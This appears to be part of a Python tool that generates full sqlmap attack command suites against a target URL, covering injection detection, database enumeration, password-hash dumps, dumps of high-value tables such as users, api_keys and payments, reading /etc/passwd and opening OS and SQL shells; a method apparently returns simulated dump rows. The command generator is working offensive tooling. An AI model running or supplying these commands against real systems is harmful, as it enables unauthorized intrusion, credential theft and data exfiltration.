    def _generate_full_sqlmap_commands(self, target_url, param, method,
                                       dbms, databases, tables, cookie):
        """Generate comprehensive sqlmap command suite for the target."""
        base = self._base_sqlmap_cmd(target_url, param, method, dbms, cookie)
        commands = [
            {"purpose": "detect_injection", "command": f"{base} --batch",
             "description": "Test if parameter is injectable"},
            {"purpose": "fingerprint_dbms", "command": f"{base} --fingerprint",
             "description": "Fingerprint the backend DBMS"},
            {"purpose": "enumerate_dbs", "command": f"{base} --dbs",
             "description": "List all databases"},
            {"purpose": "current_user", "command": f"{base} --current-user --current-db --is-dba",
             "description": "Get current user, database, and DBA status"},
            {"purpose": "dump_passwords", "command": f"{base} --passwords",
             "description": "Dump DBMS user password hashes"},
        ]
        # Per-database commands
        for db in databases:
            db_name = db["name"]
            if db_name in ("information_schema", "performance_schema", "mysql", "tempdb", "master", "postgres"):
                continue
            commands.append({
                "purpose": f"enum_tables_{db_name}",
                "command": f"{base} -D {db_name} --tables",
                "description": f"List tables in {db_name}",
            })
            commands.append({
                "purpose": f"dump_all_{db_name}",
                "command": f"{base} -D {db_name} --dump-all",
                "description": f"Dump ALL data from {db_name}",
            })

        # Targeted high-value dumps
        for tbl in tables:
            tbl_name = tbl["table"]
            if tbl_name in ("users", "api_keys", "customers", "payments", "config"):
                db_name = tbl.get("database", "")
                commands.append({
                    "purpose": f"dump_{db_name}_{tbl_name}",
                    "command": f"{base} -D {db_name} -T {tbl_name} --dump",
                    "description": f"Dump high-value table {db_name}.{tbl_name}",
                })

        # OS-level access
        commands.extend([
            {"purpose": "os_shell", "command": f"{base} --os-shell",
             "description": "Attempt OS command shell via SQL injection"},
            {"purpose": "file_read", "command": f"{base} --file-read=/etc/passwd",
             "description": "Read server files through SQL injection"},
            {"purpose": "sql_shell", "command": f"{base} --sql-shell",
             "description": "Interactive SQL shell through injection point"},
        ])
        return commands

    def _base_sqlmap_cmd(self, target_url, param, method, dbms, cookie=None):
        """Build the base sqlmap command string."""
        if method.upper() == "POST":
            cmd = f"sqlmap -u '{target_url}' --data='{param}=1' --batch --level 3 --risk 2"
        else:
            cmd = f"sqlmap -u '{target_url}?{param}=1' --batch --level 3 --risk 2"
        if dbms and dbms != "auto":
            cmd += f" --dbms={dbms}"
        if cookie:
            cmd += f" --cookie='{cookie}'"
        cmd += " --threads=4 --random-agent"
        return cmd

    def _get_columns_for_table(self, dbms, database, table):
        """Return column definitions for a known table."""
        tables = self._enumerate_tables(dbms,
                                        [{"name": database, "tables": 10}], "columns")
        for t in tables:
            if t["table"] == table:
                return t.get("columns", [])
        return [{"name": "id", "type": "int"}, {"name": "data", "type": "text"}]

    def _simulate_dump(self, dbms, database, table, columns, limit):
        """Return simulated table dump data."""
        col_names = [c["name"] if isinstance(c, dict) else c for c in columns]
        row_counts = {"users": 15420, "api_keys": 342, "payments": 89350,
                      "customers": 8750, "config": 45, "sessions": 48200,
                      "audit_log": 234000, "products": 1200}
        count = row_counts.get(table, 500)
        rows = []
        for i in range(min(5, limit)):
            row = {}
            for col in col_names:
                if "id" in col:
                    row[col] = i + 1
                elif "user" in col or "name" in col:
                    row[col] = f"user_{i+1}"
                elif "email" in col:
                    row[col] = f"user_{i+1}@example.com"
                elif "password" in col or "hash" in col:
                    row[col] = f"$2b$12${'x'*(i+10)}..."
                elif "key" in col or "token" in col or "secret" in col:
                    row[col] = f"{'k'*(i+8)}..."
                elif "amount" in col or "price" in col:
                    row[col] = round(99.99 + i * 250, 2)
                else:
                    row[col] = f"value_{i+1}"
            rows.append(row)
        return {"row_count": count, "rows": rows}

